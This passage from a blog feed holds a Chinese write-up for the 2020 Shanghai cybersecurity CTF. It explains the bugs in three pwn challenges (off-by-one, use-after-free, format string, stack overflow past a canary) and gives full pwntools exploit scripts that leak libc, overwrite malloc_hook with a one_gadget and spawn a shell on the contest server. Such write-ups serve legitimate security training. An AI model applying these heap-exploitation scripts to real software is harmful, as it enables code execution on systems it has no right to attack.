      <tag>unsortedbin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六届上海市网络安全邀请赛2020CTF部分wp</title>
    <link href="/2020/11/14/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B2020CTF%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/11/14/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B2020CTF%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="第六届上海市网络安全邀请赛2020CTF部分wp"><a href="#第六届上海市网络安全邀请赛2020CTF部分wp" class="headerlink" title="第六届上海市网络安全邀请赛2020CTF部分wp"></a>第六届上海市网络安全邀请赛2020CTF部分wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><div class="hljs"><pre><code class="hljs python">echo <span class="hljs-string">"ZmxhZ3t3MzFjMG1lNX0="</span> | base64 -d | tr <span class="hljs-number">5</span> <span class="hljs-number">6</span>flag&#123;w31c0me6&#125;</code></pre></div><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{w31c0me6}</p><h2 id="lgtwo"><a href="#lgtwo" class="headerlink" title="lgtwo"></a>lgtwo</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="hljs"><pre><code class="hljs c">v1 = sizelist[i];   sizelist[i] = v1 + <span class="hljs-number">1</span>;</code></pre></div><p>Add函数存在off by one</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>off by one 构造chunk overlaping</li><li>攻击stdout，泄漏libc地址</li><li>再次off by one 构造chunk overlaping，攻击malloc hook</li><li>改为one gadget，使用realloc 进行调节堆栈</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">45830</span>)    <span class="hljs-comment"># icqc4afd0d16403ab6b957cf18a53c6f</span>    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"?"</span>,str(size))    sa(<span class="hljs-string">"?"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'?'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">"?"</span>,str(idx))    sa(<span class="hljs-string">"?"</span>,str(data)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#1</span>    free(<span class="hljs-number">0</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#5</span>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x68</span> +  <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#4</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">6</span>,<span class="hljs-string">'\x70'</span>)    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xa5dd</span>))    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    payload = <span class="hljs-number">6</span> * p64(<span class="hljs-number">0</span>) + <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    edit(<span class="hljs-number">7</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./pwn')</span>        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">45830</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basesys_addr = <span class="hljs-number">324832</span>+libc_baseadd(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#8</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#9</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#11</span>edit(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x68</span> +  <span class="hljs-string">'\xe1'</span>)free(<span class="hljs-number">9</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span><span class="hljs-comment"># debug()</span>free(<span class="hljs-number">10</span>)edit(<span class="hljs-number">12</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_baseadd(<span class="hljs-number">0x68</span>,p64(one))realloc = libc_base + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">3</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc) edit(<span class="hljs-number">13</span>,payload)<span class="hljs-comment"># debug()</span>itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/hYy5WA.png" srcset="/img/loading.gif" alt></p><h3 id="flag-值"><a href="#flag-值" class="headerlink" title="flag 值"></a>flag 值</h3><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">25706</span>a3a293302d5e2b5814f02b6d064&#125;</code></pre></div><h2 id="EASY-ABNORMAL"><a href="#EASY-ABNORMAL" class="headerlink" title="EASY_ABNORMAL_"></a><code>EASY_ABNORMAL_</code></h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del的函数）</li><li>fmt （show name 的函数）</li><li>后门函数存在栈溢出</li></ul><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先用fmt泄漏出来栈地址 libc地址备用，然后发现只能申请2次的chunk，已经不能进行fastbin attack，只能泄漏一下heap地址，重点研究下后门函数。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">sub_11A8</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"INPUT:"</span>);  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2L</span>L, &amp;unk_202070);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x28</span>uLL) &gt; <span class="hljs-number">0x10</span> ) <span class="hljs-comment">//溢出</span>  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(<span class="hljs-number">8L</span>L, &amp;buf);    *v0 = <span class="hljs-string">"YOU ARE TOO YOUNG!"</span>;    _cxa_throw(v0, &amp;`typeinfo <span class="hljs-keyword">for</span>'<span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span>*, <span class="hljs-number">0L</span>L);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre></div><p>发现了存在8字节的栈溢出，可以溢出到rbp，但是此时已经破坏了canary。</p><p>去百度后发现<code>_cxa_allocate_exception</code>的妙用，覆盖好rbp后，其可以完成过canary的检测且可以配合上层函数的<code>leave ret</code>,完成一个栈迁移的效果。</p><p>参考链接：<br><a href="https://www.anquanke.com/post/id/89855#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855#h3-8</a></p><p>所以就覆盖rbp为heap的地址，在上面存好one gadget 地址，ret 上去即可。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">10012</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'4'</span>)    <span class="hljs-comment"># sla('dex&gt;',str(idx))</span>sla(<span class="hljs-string">'E:'</span>,<span class="hljs-string">'%p%p'</span>)sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'0x'</span>)stackbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'stackbase'</span>,stackbase)ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x3c6780</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)one = libcbase + <span class="hljs-number">0x45226</span>add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)show()<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'2:'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'23333'</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'INPUT'</span>,str(payload))itr()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/Cn5xPl.png" srcset="/img/loading.gif" alt></p><h3 id="flag-值-1"><a href="#flag-值-1" class="headerlink" title="flag 值"></a>flag 值</h3><div class="hljs"><pre><code class="hljs python">flag&#123;G00DB0YS&#125;</code></pre></div><h2 id="maj0rone"><a href="#maj0rone" class="headerlink" title="maj0rone"></a>maj0rone</h2><p>加了一堆的混淆代码，实际调试起来发现并不难。</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del函数）</li><li>堆溢出 （add函数，搭配edit函数进行堆溢出）</li></ul><p>其中堆溢出是因为:<br><img src="http://qiqianyun.chumen77.xyz/uPic/vddacU.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/9hGiy8.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/RuLBaK.png" srcset="/img/loading.gif" alt></p><p>其snprintf的返回值可以由输入的字符串长度控制，也导致了sizelist上的size被控制，申请一个小点的chunk，但是给了读入大于其长度size的字符串，即造成溢出。</p><p>其中add函数，上来的问question的check函数：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( input &lt;= <span class="hljs-number">512</span> )   v3 = input; <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">300</span> )   v4 = input; <span class="hljs-keyword">else</span>   v4 = <span class="hljs-number">300</span>; <span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">150</span> )   v5 = <span class="hljs-number">150</span>; <span class="hljs-keyword">else</span>   v5 = input; <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">80</span> )   v6 = <span class="hljs-number">80</span>; <span class="hljs-keyword">else</span>   v6 = input; v9 = v6; <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">80</span> )   v6 = <span class="hljs-number">80</span>; <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">83</span> )   v7 = <span class="hljs-number">80</span>; <span class="hljs-keyword">else</span>   v7 = v9; <span class="hljs-keyword">return</span> v7 == input;</code></pre></div><p>输入80即可。</p><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用uaf 和堆溢出,来fastbin attack 打stdout，泄漏libc</li><li>再次fastbin attack打malloc hook 为 one gadget</li><li>用realloc调节堆栈</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-comment"># icqc4afd0d16403ab6b957cf18a53c6f</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">18523</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt; "</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(sz, ctx)</span>:</span>    choose(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'que'</span>,str(<span class="hljs-number">80</span>))    sla(<span class="hljs-string">"__?"</span>, str(sz))    sa(<span class="hljs-string">"no?"</span>, str(ctx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    choose(<span class="hljs-number">2</span>)    sla(<span class="hljs-string">"ex ?"</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    choose(<span class="hljs-number">3</span>)    sla(<span class="hljs-string">"?"</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx, ctx)</span>:</span>    choose(<span class="hljs-number">4</span>)    sla(<span class="hljs-string">"ex ?"</span>, str(idx))    sa(<span class="hljs-string">"__new_content"</span>, str(ctx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)     add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>    free(<span class="hljs-number">0</span>)    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 2</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 3</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 4</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xe0'</span>)    edit(<span class="hljs-number">4</span>,p16(<span class="hljs-number">0xa5dd</span>))    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    payload = <span class="hljs-number">6</span> * p64(<span class="hljs-number">0</span>) + <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    edit(<span class="hljs-number">8</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./pwn')</span>        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">18523</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basefree(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook))<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_baserealloc = libc_base + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">3</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc) edit(<span class="hljs-number">10</span>,payload)itr()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/3Mu5of.png" srcset="/img/loading.gif" alt></p><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><div class="hljs"><pre><code class="hljs python">flag&#123;ABAFADFKLAFL_FADFKAF_FADFADFI0FACCC&#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nov. 刷题记录</title>
    <link href="/2020/11/12/Nov.%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/11/12/Nov.%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
